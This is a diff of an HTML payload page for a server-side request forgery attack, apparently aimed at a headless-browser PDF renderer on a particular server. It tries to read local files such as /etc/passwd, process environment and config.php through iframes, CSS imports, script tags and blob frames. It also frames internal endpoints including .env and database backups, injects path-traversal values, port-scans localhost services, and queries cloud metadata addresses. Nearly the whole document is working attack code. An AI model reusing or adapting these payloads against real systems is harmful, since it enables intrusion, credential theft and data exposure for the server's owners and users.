@@ -3,101 +3,226 @@
 <head><title>R</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font:8px/1.1 monospace;margin:2px}
+body{font:7px/1.1 monospace;margin:2px}
 .s{border:1px solid #000;margin:1px 0}
-h3{font-size:9px;background:#ccc;padding:1px 2px}
+h3{font-size:8px;background:#ccc;padding:1px 2px}
 iframe{width:100%;border:0}
-pre{white-space:pre-wrap;font-size:7px;background:#f5f5f5;padding:2px}
+pre{white-space:pre-wrap;font-size:6px;background:#f5f5f5;padding:1px;word-break:break-all}
+
+/* CSS file read attempts - if these load, content appears as CSS error text */
+@import url("file:///etc/passwd");
+@import url("file:///etc/hostname");
+@import url("file:///proc/version");
+@import url("file:///var/www/html/Pilot7/backend/config.php");
 </style>
+<link rel="stylesheet" href="file:///etc/passwd">
+<link rel="stylesheet" href="file:///etc/hostname">
+<link rel="stylesheet" href="file:///proc/version">
 </head>
 <body>
-<b>SSRF LFI v4</b>
 
-<!-- APPROACH: data: URI creates opaque origin, which may access file:// differently than https:// -->
+<b>SSRF v5 - Version + Endpoints</b>
+
+<!-- 1. Chromium version detection -->
 <div class="s">
-<h3>1. data: URI iframe → file:///etc/passwd via XHR</h3>
-<iframe style="height:250px" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest()%3Bx.open('GET'%2C'file%3A%2F%2F%2Fetc%2Fpasswd'%2Cfalse)%3Btry%7Bx.send()%3Bdocument.write('%3Cpre%3E'+x.responseText+'%3C%2Fpre%3E')%7Dcatch(e)%7Bdocument.write('XHR%20err%3A%20'+e.message)%7D%3C%2Fscript%3E"></iframe>
+<h3>BROWSER INFO</h3>
+<pre id="ua">...</pre>
+</div>
+
+<!-- 2. CSS file read result (if any error text leaks) -->
+<div class="s">
+<h3>CSS @import results</h3>
+<pre id="css">checking...</pre>
+</div>
+
+<!-- 3. script src file read -->
+<script src="file:///etc/passwd" onerror="document.getElementById('ss1').textContent='script src blocked'"></script>
+<script src="file:///etc/hostname" onerror="document.getElementById('ss2').textContent='script src blocked'"></script>
+<div class="s">
+<h3>script src file://</h3>
+<pre id="ss1">passwd: ?</pre>
+<pre id="ss2">hostname: ?</pre>
+</div>
+
+<!-- 4. Internal HTTPS endpoints rendered as iframes (visible in PDF) -->
+<div class="s">
+<h3>INTERNAL: /backend/ax/init.php</h3>
+<iframe style="height:120px" src="https://127.0.0.1/backend/ax/init.php"></iframe>
 </div>
 
 <div class="s">
-<h3>2. data: URI → file:///etc/hostname via XHR</h3>
-<iframe style="height:100px" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest()%3Bx.open('GET'%2C'file%3A%2F%2F%2Fetc%2Fhostname'%2Cfalse)%3Btry%7Bx.send()%3Bdocument.write('%3Cpre%3E'+x.responseText+'%3C%2Fpre%3E')%7Dcatch(e)%7Bdocument.write('XHR%20err%3A%20'+e.message)%7D%3C%2Fscript%3E"></iframe>
+<h3>INTERNAL: /backend/config.php</h3>
+<iframe style="height:80px" src="https://127.0.0.1/backend/config.php"></iframe>
 </div>
 
 <div class="s">
-<h3>3. data: URI → file:///var/www/html/Pilot7/backend/config.php</h3>
-<iframe style="height:300px" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest()%3Bx.open('GET'%2C'file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2FPilot7%2Fbackend%2Fconfig.php'%2Cfalse)%3Btry%7Bx.send()%3Bdocument.write('%3Cpre%3E'+x.responseText+'%3C%2Fpre%3E')%7Dcatch(e)%7Bdocument.write('err%3A%20'+e.message)%7D%3C%2Fscript%3E"></iframe>
+<h3>INTERNAL: /backend/ax/env.php?prj=gpsguard</h3>
+<iframe style="height:80px" src="https://127.0.0.1/backend/ax/env.php?prj=gpsguard"></iframe>
 </div>
 
 <div class="s">
-<h3>4. data: URI → file:///proc/self/environ</h3>
-<iframe style="height:200px" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest()%3Bx.open('GET'%2C'file%3A%2F%2F%2Fproc%2Fself%2Fenviron'%2Cfalse)%3Btry%7Bx.send()%3Bdocument.write('%3Cpre%3E'+x.responseText+'%3C%2Fpre%3E')%7Dcatch(e)%7Bdocument.write('err%3A%20'+e.message)%7D%3C%2Fscript%3E"></iframe>
+<h3>INTERNAL: /backend/ax/reports.php?node=3</h3>
+<iframe style="height:120px" src="https://127.0.0.1/backend/ax/reports.php?node=3"></iframe>
 </div>
 
 <div class="s">
-<h3>5. data: URI → file:///proc/self/cmdline</h3>
-<iframe style="height:100px" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest()%3Bx.open('GET'%2C'file%3A%2F%2F%2Fproc%2Fself%2Fcmdline'%2Cfalse)%3Btry%7Bx.send()%3Bdocument.write('%3Cpre%3E'+x.responseText+'%3C%2Fpre%3E')%7Dcatch(e)%7Bdocument.write('err%3A%20'+e.message)%7D%3C%2Fscript%3E"></iframe>
+<h3>INTERNAL: /admin/</h3>
+<iframe style="height:80px" src="https://127.0.0.1/admin/"></iframe>
 </div>
 
-<!-- APPROACH: blob: URI for file access -->
 <div class="s">
-<h3>6. JS blob/data iframe results</h3>
-<pre id="r">loading...</pre>
+<h3>INTERNAL: /server-status</h3>
+<iframe style="height:80px" src="https://127.0.0.1/server-status"></iframe>
+</div>
+
+<div class="s">
+<h3>INTERNAL: /nginx_status</h3>
+<iframe style="height:60px" src="https://127.0.0.1/nginx_status"></iframe>
+</div>
+
+<div class="s">
+<h3>INTERNAL: /backend/ax/get_upload_report.php?file_name=../config.php&node=3</h3>
+<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=../config.php&node=3"></iframe>
+</div>
+
+<div class="s">
+<h3>INTERNAL: /backend/ax/get_upload_report.php?file_name=....//....//....//etc/passwd&node=3</h3>
+<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=....//....//....//etc/passwd&node=3"></iframe>
+</div>
+
+<div class="s">
+<h3>INTERNAL: /phpinfo.php</h3>
+<iframe style="height:120px" src="https://127.0.0.1/phpinfo.php"></iframe>
+</div>
+
+<div class="s">
+<h3>INTERNAL: /info.php</h3>
+<iframe style="height:80px" src="https://127.0.0.1/info.php"></iframe>
+</div>
+
+<div class="s">
+<h3>INTERNAL: /backend/ax/flussonic.php</h3>
+<iframe style="height:60px" src="https://127.0.0.1/backend/ax/flussonic.php"></iframe>
+</div>
+
+<div class="s">
+<h3>INTERNAL: /backend/ax/db_backup.php</h3>
+<iframe style="height:60px" src="https://127.0.0.1/backend/ax/db_backup.php"></iframe>
+</div>
+
+<div class="s">
+<h3>INTERNAL: /backend/ax/sms.php</h3>
+<iframe style="height:60px" src="https://127.0.0.1/backend/ax/sms.php"></iframe>
+</div>
+
+<div class="s">
+<h3>INTERNAL: /.env</h3>
+<iframe style="height:60px" src="https://127.0.0.1/.env"></iframe>
+</div>
+
+<div class="s">
+<h3>INTERNAL: /backend/.env</h3>
+<iframe style="height:60px" src="https://127.0.0.1/backend/.env"></iframe>
+</div>
+
+<!-- 5. JS results -->
+<div class="s">
+<h3>HTTP FUZZ (port 8080 + 80)</h3>
+<pre id="r">scanning...</pre>
+</div>
+
+<div class="s">
+<h3>chrome:// protocol test</h3>
+<iframe style="height:60px" src="chrome://version"></iframe>
+<iframe style="height:60px" src="chrome://gpu"></iframe>
 </div>
 
 <script>
 var o='';
 function p(s){o+=s+'\n';document.getElementById('r').textContent=o}
 
-// Method: Create blob URL iframe, try file access from blob origin
-try {
-var blob = new Blob(['<script>var x=new XMLHttpRequest();x.open("GET","file:///etc/passwd",false);try{x.send();parent.postMessage(x.responseText,"*")}catch(e){parent.postMessage("blob-err:"+e.message,"*")}<\/script>'], {type:'text/html'});
-var url = URL.createObjectURL(blob);
-var bf = document.createElement('iframe');
-bf.src = url;
-bf.style = 'width:100%;height:100px;border:1px solid red';
-document.body.appendChild(bf);
-p('blob iframe created');
-} catch(e) { p('blob err: '+e.message) }
+// Version info
+var uaInfo = 'UA: ' + navigator.userAgent + '\n';
+uaInfo += 'Platform: ' + navigator.platform + '\n';
+uaInfo += 'AppVersion: ' + navigator.appVersion + '\n';
+uaInfo += 'Product: ' + navigator.product + '\n';
+try { uaInfo += 'Memory: ' + navigator.deviceMemory + 'GB\n'; } catch(e){}
+try { uaInfo += 'Cores: ' + navigator.hardwareConcurrency + '\n'; } catch(e){}
+try { uaInfo += 'Lang: ' + navigator.language + '\n'; } catch(e){}
+try { uaInfo += 'CookieEnabled: ' + navigator.cookieEnabled + '\n'; } catch(e){}
+try { uaInfo += 'WebDriver: ' + navigator.webdriver + '\n'; } catch(e){}
+try { uaInfo += 'PDF: ' + navigator.pdfViewerEnabled + '\n'; } catch(e){}
+document.getElementById('ua').textContent = uaInfo;
 
-// Listen for messages from child frames
-window.addEventListener('message', function(e) {
-  p('MSG FROM CHILD: ' + String(e.data).substring(0, 2000));
-});
-
-// Method: Fetch file:// from data: origin context via dynamic script
-try {
-var df = document.createElement('iframe');
-df.src = 'about:blank';
-df.style = 'width:100%;height:100px;border:1px solid blue';
-document.body.appendChild(df);
+// Check CSS stylesheets for file content leak
 setTimeout(function(){
+  var cssResult = '';
   try {
-    df.contentDocument.write('<script>fetch("file:///etc/passwd").then(r=>r.text()).then(t=>parent.postMessage("fetch-ok:"+t,"*")).catch(e=>parent.postMessage("fetch-err:"+e.message,"*"))<\/script>');
-    p('about:blank iframe injected');
-  } catch(e) { p('inject err: '+e.message) }
-}, 500);
-} catch(e) { p('df err: '+e.message) }
+    var sheets = document.styleSheets;
+    cssResult += 'Sheets: ' + sheets.length + '\n';
+    for (var i=0; i<sheets.length; i++) {
+      try {
+        var rules = sheets[i].cssRules || sheets[i].rules;
+        cssResult += 'Sheet['+i+'] href='+sheets[i].href+' rules='+(rules?rules.length:'null')+'\n';
+        if (rules) {
+          for (var j=0; j<Math.min(rules.length,5); j++) {
+            cssResult += '  rule['+j+']: '+rules[j].cssText.substring(0,200)+'\n';
+          }
+        }
+      } catch(e) {
+        cssResult += 'Sheet['+i+'] href='+sheets[i].href+' ERR: '+e.message+'\n';
+      }
+    }
+  } catch(e) { cssResult += 'CSS check error: '+e.message; }
+  document.getElementById('css').textContent = cssResult;
+}, 2000);
 
-// Method: Try to navigate current page to file:// after rendering everything
-// This runs last after 8 seconds - if it works, the PDF final page will be /etc/passwd
-setTimeout(function(){
-  try { window.location.href = 'file:///etc/passwd'; p('redirect attempted') } catch(e) { p('redirect err: '+e.message) }
-}, 8000);
-
-// Port scan via fetch
+// HTTP endpoint fuzzing via fetch (reads response body for non-CORS HTTP)
 async function tf(l,u){
-try{var r=await fetch(u);var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,500))}
-catch(e){p(l+' err: '+e.message)}
+  try{
+    var r=await fetch(u,{mode:'no-cors'});
+    p(l+' status='+r.status+' type='+r.type);
+    if(r.type!='opaque'){var t=await r.text();p('  body: '+t.substring(0,300))}
+  }catch(e){p(l+' ERR: '+e.message)}
 }
+
 (async function(){
-await tf('8080','http://127.0.0.1:8080/');
-await tf('8080/flus','http://127.0.0.1:8080/flussonic/api/read_config');
-await tf('8080/flus-streams','http://127.0.0.1:8080/flussonic/api/streams');
-await tf('80','http://127.0.0.1:80/');
-await tf('3000','http://127.0.0.1:3000/');
-await tf('9090','http://127.0.0.1:9090/');
-await tf('9200','http://127.0.0.1:9200/');
+  // Port 8080 paths
+  await tf('8080:/','http://127.0.0.1:8080/');
+  await tf('8080:/api','http://127.0.0.1:8080/api');
+  await tf('8080:/status','http://127.0.0.1:8080/status');
+  await tf('8080:/health','http://127.0.0.1:8080/health');
+  await tf('8080:/metrics','http://127.0.0.1:8080/metrics');
+  await tf('8080:/admin','http://127.0.0.1:8080/admin');
+  await tf('8080:/flussonic','http://127.0.0.1:8080/flussonic');
+  await tf('8080:/flussonic/api/v3/streams','http://127.0.0.1:8080/flussonic/api/v3/streams');
+  await tf('8080:/streamer/api','http://127.0.0.1:8080/streamer/api');
+  await tf('8080:/stalker_portal','http://127.0.0.1:8080/stalker_portal');
+  // Port 80
+  await tf('80:/','http://127.0.0.1:80/');
+  await tf('80:/server-status','http://127.0.0.1:80/server-status');
+  await tf('80:/nginx_status','http://127.0.0.1:80/nginx_status');
+  // Port 3306 (MySQL)
+  await tf('3306:/','http://127.0.0.1:3306/');
+  // Port 5432 (Postgres)
+  await tf('5432:/','http://127.0.0.1:5432/');
+  // Port 6379 (Redis)
+  await tf('6379:/','http://127.0.0.1:6379/');
+  // Port 9090 (Prometheus)
+  await tf('9090:/','http://127.0.0.1:9090/');
+  await tf('9090:/metrics','http://127.0.0.1:9090/metrics');
+  // Port 9200 (Elasticsearch)
+  await tf('9200:/','http://127.0.0.1:9200/');
+  // Port 8443
+  await tf('8443:/','http://127.0.0.1:8443/');
+  // Port 4443
+  await tf('4443:/','http://127.0.0.1:4443/');
+  // Internal sibling
+  await tf('235:80/','http://41.71.64.235:80/');
+  await tf('235:8080/','http://41.71.64.235:8080/');
+  // Cloud metadata
+  await tf('meta169','http://169.254.169.254/latest/meta-data/');
+  await tf('meta100','http://100.100.100.200/latest/meta-data/');
 })();
 </script>
 
